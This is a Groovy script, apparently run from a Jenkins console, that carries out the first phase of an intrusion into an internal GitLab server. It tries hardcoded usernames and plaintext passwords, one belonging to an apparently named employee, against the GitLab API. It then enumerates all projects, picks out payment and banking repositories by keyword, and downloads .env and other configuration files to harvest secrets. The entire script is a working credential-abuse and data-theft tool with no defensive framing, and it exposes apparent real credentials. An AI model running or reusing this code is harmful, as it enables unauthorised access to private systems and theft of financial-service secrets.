// PHASE 1: List ALL GitLab projects via internal IP
// GitLab: http://172.27.140.129
// Try: jenkins / e6LBqIkOI$PR1XX2oia, jenkins_legacy / JenkisLegasy25, maria.policarpo / FtMRl4fDXzIDY4Yj

def BASE = "http://172.27.140.129"

def creds = [
    ["jenkins", "e6LBqIkOI\$PR1XX2oia"],
    ["jenkins_legacy", "JenkisLegasy25"],
    ["maria.policarpo", "FtMRl4fDXzIDY4Yj"],
    ["Jenkins", "JenkisLegasy25"],
]

def workingToken = null
def workingUser = null

// First: try to get a Personal Access Token or use HTTP Basic
creds.each { c ->
    if (workingToken) return
    try {
        def enc = (c[0]+":"+c[1]).bytes.encodeBase64().toString()
        def conn = new URL(BASE + "/api/v4/user").openConnection()
        conn.connectTimeout = 8000
        conn.readTimeout = 10000
        conn.setRequestProperty("Authorization", "Basic " + enc)
        conn.setInstanceFollowRedirects(true)
        def code = conn.responseCode
        if (code == 200) {
            def body = conn.inputStream.text
            println "AUTH OK: ${c[0]} -> ${body.take(200)}"
            workingToken = enc
            workingUser = c[0]
        } else {
            def err = conn.errorStream?.text?:""
            println "AUTH FAIL ${c[0]}: [${code}] ${err.take(100)}"
        }
    } catch(e) { println "AUTH ERR ${c[0]}: ${e.message?.take(100)}" }
}

if (!workingToken) {
    println "\nNO WORKING AUTH - trying without auth (public projects)..."
    try {
        def conn = new URL(BASE + "/api/v4/projects?per_page=20").openConnection()
        conn.connectTimeout = 8000; conn.readTimeout = 10000
        def code = conn.responseCode
        println "NO-AUTH: [${code}] ${(code < 400 ? conn.inputStream : conn.errorStream)?.text?.take(300)}"
    } catch(e) { println "NO-AUTH ERR: ${e.message?.take(100)}" }
    return
}

println "\n=== USING AUTH: ${workingUser} ==="

// List ALL projects (paginated)
def allProjects = []
def page = 1
while (true) {
    try {
        def conn = new URL(BASE + "/api/v4/projects?per_page=100&page=${page}&order_by=id&sort=asc").openConnection()
        conn.connectTimeout = 10000; conn.readTimeout = 20000
        conn.setRequestProperty("Authorization", "Basic " + workingToken)
        conn.setInstanceFollowRedirects(true)
        def code = conn.responseCode
        if (code != 200) break
        def body = conn.inputStream.text
        if (body == "[]" || body == "") break
        
        // Parse JSON manually (basic)
        def matcher = body =~ /"id":(\d+),"description":"[^"]*","name":"([^"]+)","name_with_namespace":"([^"]+)","path":"([^"]+)","path_with_namespace":"([^"]+)"/
        def count = 0
        matcher.each { m ->
            allProjects << [id: m[1], name: m[2], ns: m[3], path: m[4], fullpath: m[5]]
            count++
        }
        if (count == 0) break
        page++
        if (page > 50) break // safety
    } catch(e) { 
        println "PAGE ${page} ERR: ${e.message?.take(100)}"
        break
    }
}

println "\n=== ALL PROJECTS (${allProjects.size()}) ==="
allProjects.each { p ->
    println "  [${p.id}] ${p.fullpath} (${p.name})"
}

// Filter relevant repos
def keywords = ["sears", "t1", "payment", "axii", "caja", "tienda", "monedero", "pago", "pay", "tarjeta", "banco", "card", "prod", "apifin", "dbase", "claropay", "spei"]
def relevantRepos = allProjects.findAll { p ->
    def name = p.fullpath.toLowerCase()
    keywords.any { k -> name.contains(k) }
}

println "\n=== RELEVANT REPOS (${relevantRepos.size()}) ==="
relevantRepos.each { p ->
    println "  [${p.id}] ${p.fullpath}"
}

// For each relevant repo, list files and try to get .env / config
def sensitiveFiles = [".env", ".env.production", ".env.local", ".env.prod", "docker-compose.yml", "config/database.yml", "config/local.php", ".env.example"]

println "\n=== SEARCHING SENSITIVE FILES IN RELEVANT REPOS ==="
relevantRepos.each { p ->
    println "\n--- REPO: ${p.fullpath} ---"
    
    // List files in root
    try {
        def conn = new URL(BASE + "/api/v4/projects/${p.id}/repository/tree?per_page=100&recursive=false").openConnection()
        conn.connectTimeout = 8000; conn.readTimeout = 15000
        conn.setRequestProperty("Authorization", "Basic " + workingToken)
        conn.setInstanceFollowRedirects(true)
        def code = conn.responseCode
        if (code == 200) {
            def body = conn.inputStream.text
            def files = []
            def fm = body =~ /"name":"([^"]+)"/
            fm.each { m -> files << m[1] }
            println "ROOT FILES: ${files.join(', ')}"
        } else {
            println "TREE ERR [${code}]"
        }
    } catch(e) { println "TREE ERR: ${e.message?.take(80)}" }
    
    // Try to get sensitive files
    sensitiveFiles.each { fname ->
        try {
            def enc_path = java.net.URLEncoder.encode(fname, "UTF-8").replace("+", "%20").replace("%2F", "%2F")
            def conn = new URL(BASE + "/api/v4/projects/${p.id}/repository/files/${enc_path}/raw?ref=master").openConnection()
            conn.connectTimeout = 5000; conn.readTimeout = 10000
            conn.setRequestProperty("Authorization", "Basic " + workingToken)
            conn.setInstanceFollowRedirects(true)
            def code = conn.responseCode
            if (code == 200) {
                def body = conn.inputStream.text
                println "\n  >> FOUND: ${fname}"
                println body.take(3000)
                println "  << END ${fname}"
            }
        } catch(e) { /* skip */ }
        
        // Also try main branch
        try {
            def enc_path = java.net.URLEncoder.encode(fname, "UTF-8").replace("+", "%20").replace("%2F", "%2F")
            def conn = new URL(BASE + "/api/v4/projects/${p.id}/repository/files/${enc_path}/raw?ref=main").openConnection()
            conn.connectTimeout = 5000; conn.readTimeout = 10000
            conn.setRequestProperty("Authorization", "Basic " + workingToken)
            conn.setInstanceFollowRedirects(true)
            def code = conn.responseCode
            if (code == 200) {
                def body = conn.inputStream.text
                println "\n  >> FOUND (main): ${fname}"
                println body.take(3000)
                println "  << END ${fname}"
            }
        } catch(e) { /* skip */ }
    }
}

println "\n=== DONE PHASE 1 ==="
